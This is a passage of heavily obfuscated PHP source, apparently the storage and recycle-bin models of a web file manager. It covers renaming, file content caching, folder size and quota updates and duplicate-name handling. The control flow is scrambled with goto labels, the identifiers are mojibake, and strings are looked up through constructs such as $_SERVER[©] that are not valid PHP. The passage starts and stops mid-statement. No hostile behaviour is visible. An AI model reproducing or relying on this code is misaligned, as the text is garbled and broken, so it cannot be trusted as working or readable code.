(!$Dˆ±Åñß×¼) { return !1; } goto c¬öŒˆÖˆ”; Bé½õÍ˜‡Ì: if (!$Dˆ±Åñß×¼[$F¬„ºğ®Å[378]] == $F¬„ºğ®Å[93]) { $bµáÏãˆÏ£[$F¬„ºğ®Å[380]] = get_path_ext($eÔ„–ôâ¤Ø); } Model($F¬„ºğ®Å[513])->eventRename($Dà‹°İİ›ƒ, $Dˆ±Åñß×¼[$F¬„ºğ®Å[38]], $eÔ„–ôâ¤Ø); $this->sourceCacheClear($Dà‹°İİ›ƒ); goto BôË”‡Œóà; c¬öŒˆÖˆ”: $FÛˆÈ¬ = $this->fileNameExist($Dˆ±Åñß×¼[$F¬„ºğ®Å[469]], $eÔ„–ôâ¤Ø); if ($FÛˆÈ¬) { return !1; } $bµáÏãˆÏ£ = array($F¬„ºğ®Å[394] => $eÔ„–ôâ¤Ø, $F¬„ºğ®Å[532] => USER_ID); goto Bé½õÍ˜‡Ì; Fî¤Š †™‹: } public function setNamePinyin($Dš“ ŸæØ, $e÷¹Ëò¶Ó, $c•°ÆÊ§Š¶ = true) { $A®¤–ÚÌµ¶ =& $_SERVER[©]; $aéÆ£¾Ÿ“Ï = Input::check($e÷¹Ëò¶Ó, $A®¤–ÚÌµ¶[536]); if ($c•°ÆÊ§Š¶ && !$aéÆ£¾Ÿ“Ï) { return; } if (!$aéÆ£¾Ÿ“Ï) { $this->metaSet($Dš“ ŸæØ, $A®¤–ÚÌµ¶[424], null); $this->metaSet($Dš“ ŸæØ, $A®¤–ÚÌµ¶[423], null); return; } $bµÌæŸ¦§à = array($A®¤–ÚÌµ¶[424] => str_replace($A®¤–ÚÌµ¶[60], $A®¤–ÚÌµ¶[43], Pinyin::encode($e÷¹Ëò¶Ó)), $A®¤–ÚÌµ¶[423] => Pinyin::encode($e÷¹Ëò¶Ó, $A®¤–ÚÌµ¶[537])); $this->metaSet($Dš“ ŸæØ, $bµÌæŸ¦§à); } public function getContent($D÷¹ãÌÒØÓ) { goto BãŞœÄó««; EäÀÑÆôÑ: return IO::getContent($CŠ‡Úõø[$b…­†­¹¡[85]]); goto a¯¶Ç¨‘²â; D°ƒã›óè¹: if ($CŠ‡Úõø[$b…­†­¹¡[87]] == 0) { return $b…­†­¹¡[43]; } $BŒªåù‹ŸÎ = $b…­†­¹¡[2355] . $CŠ‡Úõø[$b…­†­¹¡[173]]; if ($CŠ‡Úõø[$b…­†­¹¡[87]] <= 1024 * 10) { $e‚Ñô†¼‚µ = Cache::get($BŒªåù‹ŸÎ); if (!$e‚Ñô†¼‚µ) { $e‚Ñô†¼‚µ = IO::getContent($CŠ‡Úõø[$b…­†­¹¡[85]]); Cache::set($BŒªåù‹ŸÎ, $e‚Ñô†¼‚µ); } return $e‚Ñô†¼‚µ; } goto EäÀÑÆôÑ; BãŞœÄó««: $b…­†­¹¡ =& $_SERVER[©]; $CŠ‡Úõø = $this->fileInfoGet($D÷¹ãÌÒØÓ); if (!$CŠ‡Úõø) { return !1; } goto D°ƒã›óè¹; a¯¶Ç¨‘²â: } public function setDesc($f ‹‹±Œã¢, $dØÊ×îÇ†ë) { $fò­äŸÏÓ =& $_SERVER[©]; Model($fò­äŸÏÓ[513])->eventAddDesc($f ‹‹±Œã¢, $dØÊ×îÇ†ë); return $this->metaSet($f ‹‹±Œã¢, $fò­äŸÏÓ[413], $dØÊ×îÇ†ë); } public function setContent($DÊ†¿¦†Ïù, $A—º´‡ØŒ = '') { goto c»„öÈ”£µ; c»„öÈ”£µ: $d›¼—’é… =& $_SERVER[©]; $CÊÂ«Õˆ“º = $this->sourceInfo($DÊ†¿¦†Ïù); $bÒ»÷Ë£¯± = $this->fileInfoGet($DÊ†¿¦†Ïù); goto b±•È„»¦; C–ˆ‚—™ë: if (!$E…É”°ÍÎ‚) { return Model($d›¼—’é…[430])->remove($bÒÚ“ÂŒ„§[$d›¼—’é…[427]]); } $this->folderSizeReset($CÊÂ«Õˆ“º[$d›¼—’é…[469]]); return !0; goto d‡øÇ¡‘¹Í; b±•È„»¦: if (!$bÒ»÷Ë£¯± || !$CÊÂ«Õˆ“º) { return !1; } $bÒÚ“ÂŒ„§ = Model($d›¼—’é…[430])->addFileByContent($A—º´‡ØŒ, $CÊÂ«Õˆ“º[$d›¼—’é…[38]]); $E…É”°ÍÎ‚ = $this->fileHistory($CÊÂ«Õˆ“º, $bÒÚ“ÂŒ„§[$d›¼—’é…[427]], $bÒÚ“ÂŒ„§[$d›¼—’é…[87]]); goto C–ˆ‚—™ë; d‡øÇ¡‘¹Í: } public function fileSubstr($CéÚßé§¬ñ, $c‡Ò³ °³Ï, $DØ”†ÏÙ»ƒ) { $d¾öµå‰ƒ = $this->fileInfoGet($CéÚßé§¬ñ); if (!$d¾öµå‰ƒ) { return !1; } return IO::fileSubstr($d¾öµå‰ƒ[$_SERVER[©][85]], $c‡Ò³ °³Ï, $DØ”†ÏÙ»ƒ); } public function fileInfoGet($F÷œæÛğñ) { goto e¶ßèÀñ—í; BË¸À¬Õó¬: $d¦¯Ñµ‰§ = $C›§ß×‚†[433] . $BÖ‚¢Ï£»[$C›§ß×‚†[427]]; $Eé•óÖ‡Ş = _get(self::$cacheFileInfo, $d¦¯Ñµ‰§); if ($Eé•óÖ‡Ş) { return $Eé•óÖ‡Ş; } goto FäÉ‡Œµö; F¥“Àš™÷: return $DÔô ™‡²¸; goto FÑœ‚Öë°Ü; FäÉ‡Œµö: $DÔô ™‡²¸ = Model($C›§ß×‚†[430])->fileInfo($BÖ‚¢Ï£»[$C›§ß×‚†[427]]); if ($DÔô ™‡²¸) { $DÔô ™‡²¸[$C›§ß×‚†[38]] = $BÖ‚¢Ï£»[$C›§ß×‚†[38]]; } self::$cacheFileInfo[$d¦¯Ñµ‰§] = $DÔô ™‡²¸; goto F¥“Àš™÷; e¶ßèÀñ—í: $C›§ß×‚† =& $_SERVER[©]; $BÖ‚¢Ï£» = $this->sourceInfo($F÷œæÛğñ); if (!$BÖ‚¢Ï£» || $BÖ‚¢Ï£»[$C›§ß×‚†[378]]) { return !1; } goto BË¸À¬Õó¬; FÑœ‚Öë°Ü: } private function folderChildrenNumber($EéÈ¢»ŸÆ) { $a‡ô•È÷¥ =& $_SERVER[©]; $eá‹ßƒ¢Ëá = $this->sourceInfo($EéÈ¢»ŸÆ); $A…è ’í¹ä = array($a‡ô•È÷¥[533] => array($a‡ô•È÷¥[491], $eá‹ßƒ¢Ëá[$a‡ô•È÷¥[467]] . $EéÈ¢»ŸÆ . $a‡ô•È÷¥[492]), $a‡ô•È÷¥[404] => intval($eá‹ßƒ¢Ëá[$a‡ô•È÷¥[405]]), $a‡ô•È÷¥[526] => 1); $FÙÜ‘ÈÏ‹ = $this->where($A…è ’í¹ä)->count(); $BÀƒèòÃºÁ = $this->where($A…è ’í¹ä)->where(array($a‡ô•È÷¥[526] => 0))->count(); return array($a‡ô•È÷¥[91] => $BÀƒèòÃºÁ, $a‡ô•È÷¥[92] => $FÙÜ‘ÈÏ‹); } public function pathInfo($Dµòµ‘°œ, $dƒ×Ê‚Ãâ˜ = false) { goto D’ÅŞ¡³ï¢; D’ÅŞ¡³ï¢: $eªŒÉæ©İâ =& $_SERVER[©]; $AÓ¹çùªŠŒ = $eªŒÉæ©İâ[419] . intval($dƒ×Ê‚Ãâ˜) . $eªŒÉæ©İâ[420] . $Dµòµ‘°œ; $b©»—‘ºØ = _get(self::$cachePathInfo, $AÓ¹çùªŠŒ); goto aÅÈœ¹“ç; dºãİ‡‚ÑÍ: $F“¾îíó = $this->_listDataApplyItem($F“¾îíó, $dƒ×Ê‚Ãâ˜); self::$cachePathInfo[$AÓ¹çùªŠŒ] = $F“¾îíó; return $F“¾îíó; goto F´ê±‚ø ™; aÅÈœ¹“ç: if ($b©»—‘ºØ) { return $b©»—‘ºØ; } $F“¾îíó = $this->sourceInfo($Dµòµ‘°œ); if (!$F“¾îíó) { return !1; } goto dºãİ‡‚ÑÍ; F´ê±‚ø ™: } public static $cachePathInfoMore = array(); public function pathInfoMore($Dì‘ƒÙÙØ®) { goto dòÛ„¢¨İ; EŞÜ«è¡ë: self::$cachePathInfoMore[$Dì‘ƒÙÙØ®] = $e†Ö½†ª¹; return $e†Ö½†ª¹; goto AÄŸïºØ; dòÛ„¢¨İ: $Fİ¥‡É¿¡ =& $_SERVER[©]; $BĞŸ·ôÖ©¹ = _get(self::$cachePathInfoMore, $Dì‘ƒÙÙØ®); if ($BĞŸ·ôÖ©¹) { return $BĞŸ·ôÖ©¹; } goto fãÙØ…††Í; fãÙØ…††Í: $e†Ö½†ª¹ = $this->pathInfo($Dì‘ƒÙÙØ®); if (!$e†Ö½†ª¹) { return !1; } if ($e†Ö½†ª¹[$Fİ¥‡É¿¡[378]] == $Fİ¥‡É¿¡[93]) { $e†Ö½†ª¹[$Fİ¥‡É¿¡[90]] = $this->folderChildrenNumber($Dì‘ƒÙÙØ®); } goto EŞÜ«è¡ë; AÄŸïºØ: } public function sourceInfo($F †À¬ƒáö) { goto BŠêâƒ•‹×; a¤¾Ü–Ìç : self::$cacheSourceInfo[$C£İ†¢ˆƒ] = $Cîª½Ê­; return self::$cacheSourceInfo[$C£İ†¢ˆƒ]; goto B¼¢Œµ‡á; BŠêâƒ•‹×: $e‘¼ñ³Ù =& $_SERVER[©]; if (!$F †À¬ƒáö) { return array(); } $C£İ†¢ˆƒ = $e‘¼ñ³Ù[418] . $F †À¬ƒáö; goto CßóùÜ¨¼Â; CßóùÜ¨¼Â: $d—Œ¶õÓã‹ = _get(self::$cacheSourceInfo, $C£İ†¢ˆƒ); if ($d—Œ¶õÓã‹) { return $d—Œ¶õÓã‹; } $Cîª½Ê­ = $this->where(array($e‘¼ñ³Ù[377] => $F †À¬ƒáö))->find(); goto a¤¾Ü–Ìç ; B¼¢Œµ‡á: } public function sourceCacheClear($FÙ½×Öñ¾» = false) { if ($FÙ½×Öñ¾» == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[©][418] . $FÙ½×Öñ¾»]); } public function pathInfoByPath($aéë¼ˆ¨¡–, $dìØâéöŒ„) { $B¡ïŞº¶ç– =& $_SERVER[©]; $B‰À‰èÖÉ = !$dìØâéöŒ„ ? array() : explode($B¡ïŞº¶ç–[18], trim($dìØâéöŒ„, $B¡ïŞº¶ç–[18])); $E…Ì­˜Í’ó = $aéë¼ˆ¨¡–; foreach ($B‰À‰èÖÉ as $cÚ‡¹ƒÔ½…) { $b‹•‰Ğ¹Ğá = array($B¡ïŞº¶ç–[469] => $E…Ì­˜Í’ó, $B¡ïŞº¶ç–[38] => $cÚ‡¹ƒÔ½…); $B¨­¶éœ³› = $this->where($b‹•‰Ğ¹Ğá)->select(); if (!$B¨­¶éœ³›) { return !1; } $B¨­¶éœ³› = array_sort_by($B¨­¶éœ³›, $B¡ïŞº¶ç–[405]); $E…Ì­˜Í’ó = $B¨­¶éœ³›[0][$B¡ïŞº¶ç–[377]]; } return $this->pathInfo($E…Ì­˜Í’ó, !0); } protected function updateModifyTime($cà·ß†£„¥) { goto cŞæĞ–Áà; dè¹Ö§‰Ÿ: $this->where($eÉµ˜Ê›æŞ)->save($D²•…äÊˆ); goto C„¥•áÑ; cŞæĞ–Áà: $CÑîè»Ğ® =& $_SERVER[©]; if (!$cà·ß†£„¥) { return; } if (!is_array($cà·ß†£„¥)) { $cà·ß†£„¥ = array($cà·ß†£„¥); } goto f…ÅïŒ‡¡¶; f…ÅïŒ‡¡¶: foreach ($cà·ß†£„¥ as $F¸„ÈÚ³‰¦ => $cììôºÎË) { $cà·ß†£„¥[$F¸„ÈÚ³‰¦] = intval($cììôºÎË); } $eÉµ˜Ê›æŞ = array($CÑîè»Ğ®[377] => array($CÑîè»Ğ®[17], $cà·ß†£„¥)); $D²•…äÊˆ = array($CÑîè»Ğ®[532] => USER_ID, $CÑîè»Ğ®[398] => time()); goto dè¹Ö§‰Ÿ; C„¥•áÑ: } public function folderSizeReset($eë ÃŞğƒô) { goto Dù£ÏÛ­; A¾Í„­¿ğÛ: CacheLock::lock($bÄ¦‹‘¤, 20); $this->sourceCacheClear($eë ÃŞğƒô); $BÇŞ—¢Ó­ = $this->sourceInfo($eë ÃŞğƒô); goto b¤ô‚æŒ; FÄ‹¢ª’”¹: $d¯ã¨– ”Á = $F„ƒˆ•ì´® - intval($BÇŞ—¢Ó­[$cÇ´÷É¤¯­[87]]); if ($d¯ã¨– ”Á == 0) { return CacheLock::unlock($bÄ¦‹‘¤); } $this->where(array($cÇ´÷É¤¯­[391] => $eë ÃŞğƒô))->setField($cÇ´÷É¤¯­[87], $F„ƒˆ•ì´®); goto dÚ¢Š¾ƒ©­; b¤ô‚æŒ: $eš˜„ÕÇ™¨ = array($cÇ´÷É¤¯­[376] => $eë ÃŞğƒô, $cÇ´÷É¤¯­[404] => 0); $F„ƒˆ•ì´® = $this->where($eš˜„ÕÇ™¨)->sum($cÇ´÷É¤¯­[87]); $F„ƒˆ•ì´® = intval($F„ƒˆ•ì´®); goto FÄ‹¢ª’”¹; Dù£ÏÛ­: $cÇ´÷É¤¯­ =& $_SERVER[©]; if ($this->statusIgnoreResetSpace) { return; } $bÄ¦‹‘¤ = $cÇ´÷É¤¯­[2356] . $eë ÃŞğƒô; goto A¾Í„­¿ğÛ; A¡¶¤õ‹Í½: CacheLock::unlock($bÄ¦‹‘¤); goto e…¬ğ‘Ë; dÚ¢Š¾ƒ©­: $aæÉƒŠ„µŸ = $this->parentLevelArray($BÇŞ—¢Ó­[$cÇ´÷É¤¯­[467]]); if ($aæÉƒŠ„µŸ) { $eš˜„ÕÇ™¨ = array($cÇ´÷É¤¯­[377] => array($cÇ´÷É¤¯­[392], $aæÉƒŠ„µŸ)); if ($d¯ã¨– ”Á < 0) { $eš˜„ÕÇ™¨[$cÇ´÷É¤¯­[87]] = array($cÇ´÷É¤¯­[926], abs($d¯ã¨– ”Á)); } $this->where($eš˜„ÕÇ™¨)->setAdd($cÇ´÷É¤¯­[87], $d¯ã¨– ”Á); } $this->targetSpaceUpdate($BÇŞ—¢Ó­[$cÇ´÷É¤¯­[379]], $BÇŞ—¢Ó­[$cÇ´÷É¤¯­[464]]); goto A¡¶¤õ‹Í½; e…¬ğ‘Ë: } public function folderSizeResetChildren($Bó¨ÑóÆèò) { goto C£µ´´¹ŠÃ; C£µ´´¹ŠÃ: $aŒ¸Öèœøß =& $_SERVER[©]; $this->sourceCacheClear($Bó¨ÑóÆèò); $C±Ÿø¨â = $this->sourceInfo($Bó¨ÑóÆèò); goto FŞ¿‘¾«; aÜĞƒĞË¦: $cŠêä¯”ğ‘[] = $C±Ÿø¨â; $cŠêä¯”ğ‘ = array_to_keyvalue($cŠêä¯”ğ‘, $aŒ¸Öèœøß[377]); foreach ($cŠêä¯”ğ‘ as $c£‚‰‚Ûˆ => $a’Íãö¼¦œ) { $cŠêä¯”ğ‘[$c£‚‰‚Ûˆ][$aŒ¸Öèœøß[2358]] = $cŠêä¯”ğ‘[$c£‚‰‚Ûˆ][$aŒ¸Öèœøß[87]]; $cŠêä¯”ğ‘[$c£‚‰‚Ûˆ][$aŒ¸Öèœøß[87]] = 0; } goto cÆ°ğõŒ¿; fãÓÑåÆºö: foreach ($cŠêä¯”ğ‘ as $a’Íãö¼¦œ) { if ($a’Íãö¼¦œ[$aŒ¸Öèœøß[87]] == $a’Íãö¼¦œ[$aŒ¸Öèœøß[2358]]) { continue; } $Aàóó¤†åó[] = array($aŒ¸Öèœøß[377], $a’Íãö¼¦œ[$aŒ¸Öèœøß[377]], $aŒ¸Öèœøß[87], $a’Íãö¼¦œ[$aŒ¸Öèœøß[87]]); } $this->saveAll($Aàóó¤†åó); goto E¼Á²ë³ó; FŞ¿‘¾«: $B£†¦Šª ´ = array($aŒ¸Öèœøß[526] => 1, $aŒ¸Öèœøß[533] => array($aŒ¸Öèœøß[491], $C±Ÿø¨â[$aŒ¸Öèœøß[467]] . $Bó¨ÑóÆèò . $aŒ¸Öèœøß[492])); $B“àë¹æ = $aŒ¸Öèœøß[2357]; $cŠêä¯”ğ‘ = $this->field($B“àë¹æ)->where($B£†¦Šª ´)->select(); goto eñãğâ”æ÷; eñãğâ”æ÷: $B£†¦Šª ´[$aŒ¸Öèœøß[378]] = 0; $E¸ğŒ¼§‚Ş = $this->field($B“àë¹æ)->where($B£†¦Šª ´)->select(); if (!$E¸ğŒ¼§‚Ş) { return; } goto aÜĞƒĞË¦; cÆ°ğõŒ¿: foreach ($E¸ğŒ¼§‚Ş as $a’Íãö¼¦œ) { $a¸Û“…® = $a’Íãö¼¦œ[$aŒ¸Öèœøß[469]] . $aŒ¸Öèœøß[43]; if (!isset($cŠêä¯”ğ‘[$a¸Û“…®])) { continue; } if ($a’Íãö¼¦œ[$aŒ¸Öèœøß[405]] == $cŠêä¯”ğ‘[$a¸Û“…®][$aŒ¸Öèœøß[405]]) { $cŠêä¯”ğ‘[$a¸Û“…®][$aŒ¸Öèœøß[87]] += $a’Íãö¼¦œ[$aŒ¸Öèœøß[87]]; } } foreach ($cŠêä¯”ğ‘ as $a’Íãö¼¦œ) { $E¨ˆˆ––¤ = $this->parentLevelArray($a’Íãö¼¦œ[$aŒ¸Öèœøß[467]]); foreach ($E¨ˆˆ––¤ as $a¸Û“…®) { $a¸Û“…® = $a¸Û“…® . $aŒ¸Öèœøß[43]; if (!isset($cŠêä¯”ğ‘[$a¸Û“…®])) { continue; } if ($a’Íãö¼¦œ[$aŒ¸Öèœøß[405]] == $cŠêä¯”ğ‘[$a¸Û“…®][$aŒ¸Öèœøß[405]]) { $cŠêä¯”ğ‘[$a¸Û“…®][$aŒ¸Öèœøß[87]] += $a’Íãö¼¦œ[$aŒ¸Öèœøß[87]]; } } } $Aàóó¤†åó = array(); goto fãÓÑåÆºö; E¼Á²ë³ó: } public function userSpaceReset($a„º Š†³Ø = false) { $eŒÔš°¨–¦ =& $_SERVER[©]; $C¯ÓÊÌÕÄ = $this->where(array($eŒÔš°¨–¦[379] => self::TYPE_USER, $eŒÔš°¨–¦[464] => $a„º Š†³Ø, $eŒÔš°¨–¦[378] => 0))->sum($eŒÔš°¨–¦[87]); Model($eŒÔš°¨–¦[482])->userEdit($a„º Š†³Ø, array($eŒÔš°¨–¦[2088] => $C¯ÓÊÌÕÄ)); } public function targetSpaceUpdate($Bº¶·ÉßÀ‡, $fÈ³µï†‘) { $eõËèĞÚÏó =& $_SERVER[©]; if (!$fÈ³µï†‘) { return; } if (!in_array($Bº¶·ÉßÀ‡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $c’×Î®•• = $this->targetSpaceSize($Bº¶·ÉßÀ‡, $fÈ³µï†‘); if ($Bº¶·ÉßÀ‡ == self::TYPE_USER) { Model($eõËèĞÚÏó[482])->userEdit($fÈ³µï†‘, array($eõËèĞÚÏó[2088] => $c’×Î®••)); } else { if ($Bº¶·ÉßÀ‡ == self::TYPE_GROUP) { Model($eõËèĞÚÏó[466])->groupEdit($fÈ³µï†‘, array($eõËèĞÚÏó[2088] => $c’×Î®••)); } } } public function targetSpaceSize($c¶†¸äÊï, $e¡ÛÅ’Õ­) { goto dõá•‡ÑâĞ; dõá•‡ÑâĞ: $aÑ›¢òÁˆ =& $_SERVER[©]; $A§óĞîÍï³ = $this->sourceRoot($c¶†¸äÊï, $e¡ÛÅ’Õ­, !0); if (!$A§óĞîÍï³) { return 0; } goto b•ëÒãº—µ; DÙÉá™¿§: return $dÙÙîô›Œé; goto dË‘‡æ³Ì; b•ëÒãº—µ: $dÙÙîô›Œé = floatval($A§óĞîÍï³[$aÑ›¢òÁˆ[87]]); $a®ó·ÏÄë¦ = array($aÑ›¢òÁˆ[533] => array($aÑ›¢òÁˆ[491], $aÑ›¢òÁˆ[478] . $A§óĞîÍï³[$aÑ›¢òÁˆ[377]] . $aÑ›¢òÁˆ[492])); $f®ÛÜ¨ÅŞ = Model($aÑ›¢òÁˆ[403])->field($aÑ›¢òÁˆ[391])->where($a®ó·ÏÄë¦)->select(); goto B…ÂĞ½ªŸƒ; B…ÂĞ½ªŸƒ: $f®ÛÜ¨ÅŞ = array_to_keyvalue($f®ÛÜ¨ÅŞ, $aÑ›¢òÁˆ[43], $aÑ›¢òÁˆ[377]); $f®ÛÜ¨ÅŞ = array_unique(array_filter($f®ÛÜ¨ÅŞ)); if ($f®ÛÜ¨ÅŞ) { $a®ó·ÏÄë¦ = array($aÑ›¢òÁˆ[391] => array($aÑ›¢òÁˆ[392], $f®ÛÜ¨ÅŞ)); $dÙÙîô›Œé += floatval($this->where($a®ó·ÏÄë¦)->sum($aÑ›¢òÁˆ[87])); } goto DÙÉá™¿§; dË‘‡æ³Ì: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($aÊ¶–ã³éÌ) { return $this->fileTypeProfile($aÊ¶–ã³éÌ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($DØ›á´à§´) { return $this->fileTypeProfile($DØ›á´à§´, SourceModel::TYPE_GROUP); } private function fileTypeProfile($cã¿©ƒí¹š, $F¡³´ª‚ğ) { goto aˆĞùÜ»æÎ; AÌºèï–…†: $CÓÍªˆ”ŒÅ = array(); $CÓÍªˆ”ŒÅ[$cŒšÙ¦™‡¶[2360]] = array($cŒšÙ¦™‡¶[2361] => LNG($cŒšÙ¦™‡¶[2360]), $cŒšÙ¦™‡¶[2362] => $this->where($F®Óº ©ÀÃ)->count(), $cŒšÙ¦™‡¶[528] => $this->where($F®Óº ©ÀÃ)->sum($cŒšÙ¦™‡¶[87])); $AŞ¸èš²Ş® = KodIO::fileTypeList(); goto d†ò™››³‚; Aİ²Ò§ÉÀ•: if ($FªÖ ¯Ö) { return $FªÖ ¯Ö; } $F®Óº ©ÀÃ = array($cŒšÙ¦™‡¶[526] => 0); if ($cã¿©ƒí¹š != !1) { $F®Óº ©ÀÃ[$cŒšÙ¦™‡¶[464]] = $cã¿©ƒí¹š; $F®Óº ©ÀÃ[$cŒšÙ¦™‡¶[379]] = $F¡³´ª‚ğ; } goto AÌºèï–…†; aˆĞùÜ»æÎ: $cŒšÙ¦™‡¶ =& $_SERVER[©]; $BˆÚé¯ƒŞ = $cŒšÙ¦™‡¶[2359] . $cã¿©ƒí¹š . $cŒšÙ¦™‡¶[80] . $F¡³´ª‚ğ; $FªÖ ¯Ö = Cache::get($BˆÚé¯ƒŞ); goto Aİ²Ò§ÉÀ•; d†ò™››³‚: foreach ($AŞ¸èš²Ş® as $E¥Şì„“êÄ => $E¿‘íÚ›ñá) { $F®Óº ©ÀÃ[$cŒšÙ¦™‡¶[380]] = $this->fileTypeWhere($E¥Şì„“êÄ); $CÓÍªˆ”ŒÅ[$E¥Şì„“êÄ] = array($cŒšÙ¦™‡¶[2361] => $E¿‘íÚ›ñá[$cŒšÙ¦™‡¶[38]], $cŒšÙ¦™‡¶[2362] => $this->where($F®Óº ©ÀÃ)->count(), $cŒšÙ¦™‡¶[528] => $this->where($F®Óº ©ÀÃ)->sum($cŒšÙ¦™‡¶[87])); } Cache::set($BˆÚé¯ƒŞ, $CÓÍªˆ”ŒÅ, 1200); return $CÓÍªˆ”ŒÅ; goto AŸé´·´¦é; AŸé´·´¦é: } public function fileNameExist($a³…îÙ¦Éò, $FÁ™°çŸÇ) { $C´§¢ä„¬ğ =& $_SERVER[©]; $FÒŒÖ“ö¨ = $this->childList($a³…îÙ¦Éò); foreach ($FÒŒÖ“ö¨ as $AÇÂ÷ÛÔÏï) { if ($AÇÂ÷ÛÔÏï[$C´§¢ä„¬ğ[38]] == $FÁ™°çŸÇ) { return $AÇÂ÷ÛÔÏï[$C´§¢ä„¬ğ[377]]; } } return !1; } public function childList($bŞ²Úñ ß†) { goto f—îäÈÌôŠ; f—îäÈÌôŠ: $cê††¤Ó¶‚ =& $_SERVER[©]; $dšàİôš‡Œ = $cê††¤Ó¶‚[2340] . $bŞ²Úñ ß†; if (isset(self::$cacheChildList[$dšàİôš‡Œ])) { return self::$cacheChildList[$dšàİôš‡Œ]; } goto A‹Êô³²Œø; cë¶æŸ‘ºï: self::$cacheChildList[$dšàİôš‡Œ] = $bãÑîß³ƒ–; foreach ($bãÑîß³ƒ– as $AÑÕæ¤±Š¦) { $dšàİôš‡Œ = $cê††¤Ó¶‚[418] . $AÑÕæ¤±Š¦[$cê††¤Ó¶‚[377]]; self::$cacheSourceInfo[$dšàİôš‡Œ] = $AÑÕæ¤±Š¦; } return $bãÑîß³ƒ–; goto C­ÍŸ‡¥‰; A‹Êô³²Œø: $E™ôéù³‘É = array($cê††¤Ó¶‚[469] => intval($bŞ²Úñ ß†), $cê††¤Ó¶‚[405] => 0); $bãÑîß³ƒ– = $this->where($E™ôéù³‘É)->select(); $bãÑîß³ƒ– = $bãÑîß³ƒ– ? $bãÑîß³ƒ– : array(); goto cë¶æŸ‘ºï; C­ÍŸ‡¥‰: } public function fileNameAuto($FÊºöĞÆË, $AæçƒÒ, $e»áñª ²ì = REPEAT_RENAME, $e§åõ°æ·² = false) { $Fóîä³ĞİÇ =& $_SERVER[©]; $bôÄĞÛ—İ° = $this->childList($FÊºöĞÆË); $b›ƒâƒÚÃ = array_to_keyvalue($bôÄĞÛ—İ°, $Fóîä³ĞİÇ[43], $Fóîä³ĞİÇ[38]); return $this->fileNameAutoGet($b›ƒâƒÚÃ, $AæçƒÒ, $e»áñª ²ì, $e§åõ°æ·²); } public function fileNameAutoGet($AÉ¯ÎŒÜ, $DæÜßåâ, $føÎáš½±Û, $fî‡ßÃÇ¥Ù) { $EÛíÌ×¤Äš =& $_SERVER[©]; if ($føÎáš½±Û == REPEAT_REPLACE || !$AÉ¯ÎŒÜ || !in_array_not_case($DæÜßåâ, $AÉ¯ÎŒÜ) || $fî‡ßÃÇ¥Ù && $føÎáš½±Û != REPEAT_RENAME_FOLDER) { return $DæÜßåâ; } if ($føÎáš½±Û == REPEAT_SKIP) { return !1; } $eÏº¨ÅË = $EÛíÌ×¤Äš[101] . get_path_ext($DæÜßåâ); $eÏº¨ÅË = $eÏº¨ÅË == $EÛíÌ×¤Äš[101] || $fî‡ßÃÇ¥Ù ? $EÛíÌ×¤Äš[43] : $eÏº¨ÅË; for ($BÃÛ¢½éŠé = 1; $BÃÛ¢½éŠé <= count($AÉ¯ÎŒÜ) + 1; $BÃÛ¢½éŠé++) { $B²Ï¬œ¯÷ò = substr($DæÜßåâ, 0, strlen($DæÜßåâ) - strlen($eÏº¨ÅË)); $F âÉ¡ÑĞâ = $B²Ï¬œ¯÷ò . "\x28{$BÃÛ¢½éŠé}\x29{$eÏº¨ÅË}"; if (!in_array_not_case($F âÉ¡ÑĞâ, $AÉ¯ÎŒÜ)) { return $F âÉ¡ÑĞâ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\143\145\x5f\x72\145\143\171\143\154\145"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\151\x6d\x65", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\x66\x75\156\143\x74\151\157\156")); public function listData($BÈ»À‰’£Á = false) { $cšîé¯±ÍÊ =& $_SERVER[©]; $BÈ»À‰’£Á = $BÈ»À‰’£Á ? $BÈ»À‰’£Á : USER_ID; $AªÎ¦‚°Åõ = $this->where(array($cšîé¯±ÍÊ[1425] => $BÈ»À‰’£Á))->select(); return array_to_keyvalue($AªÎ¦‚°Åõ, $cšîé¯±ÍÊ[43], $cšîé¯±ÍÊ[377]); } public function moveToRecycle($E¾–Û‚Û“ö) { goto F¢Ã×Í›–Í; F±Ì†¾ƒ•‰: if (!$E¡§„¬®‰ || $E¡§„¬®‰[$cšî‹—öùŸ[405]] == $cšî‹—öùŸ[93]) { return; } $AæÒÂßñ£é = array($cšî‹—öùŸ[391] => $E¾–Û‚Û“ö, $cšî‹—öùŸ[1425] => USER_ID, $cšî‹—öùŸ[529] => $E¡§„¬®‰[$cšî‹—öùŸ[379]], $cšî‹—öùŸ[530] => $E¡§„¬®‰[$cšî‹—öùŸ[464]], $cšî‹—öùŸ[533] => $E¡§„¬®‰[$cšî‹—öùŸ[467]]); $this->add($AæÒÂßñ£é); goto cœ‡‘õàÜ¢; F¢Ã×Í›–Í: $cšî‹—öùŸ =& $_SERVER[©]; $aùÂ¦Â¾ÁÌ = Model($cšî‹—öùŸ[1114]); $E¡§„¬®‰ = $aùÂ¦Â¾ÁÌ->sourceInfo($E¾–Û‚Û“ö); goto F±Ì†¾ƒ•‰; cœ‡‘õàÜ¢: $this->recycleMove($E¾–Û‚Û“ö, 1); if ($E¡§„¬®‰[$cšî‹—öùŸ[378]] == $cšî‹—öùŸ[93]) { $eÑéêŒÂŠ’ = array($cšî‹—öùŸ[533] => array($cšî‹—öùŸ[491], $E¡§„¬®‰[$cšî‹—öùŸ[467]] . $E¾–Û‚Û“ö . $cšî‹—öùŸ[492])); $aùÂ¦Â¾ÁÌ->where($eÑéêŒÂŠ’)->setField($cšî‹—öùŸ[405], 1); } goto eƒÑ¡ù×; eƒÑ¡ù×: } public function clear() { $this->remove(!1); } public function remove($f‚ ñÇÃğ = false) { goto BÉï¸‘†¯®; bÍµ«†§•Š: foreach ($aïÁÒ°´Ÿ“ as $c†ØğÆ§Ç) { $F¶ÜòŠÙæ‡->targetSpaceUpdate($c†ØğÆ§Ç[$DÇ÷Ÿ³­…°[379]], $c†ØğÆ§Ç[$DÇ÷Ÿ³­…°[464]]); } goto cÎé—Æ‚•; eÎŸÃÑ–‡: $f‚ ñÇÃğ = $f‚ ñÇÃğ === !1 ? !1 : $f‚ ñÇÃğ; $aïÁÒ°´Ÿ“ = array(); foreach ($dÕ™‡ê³‰Ï as $E¼¦Àé Ñ) { if 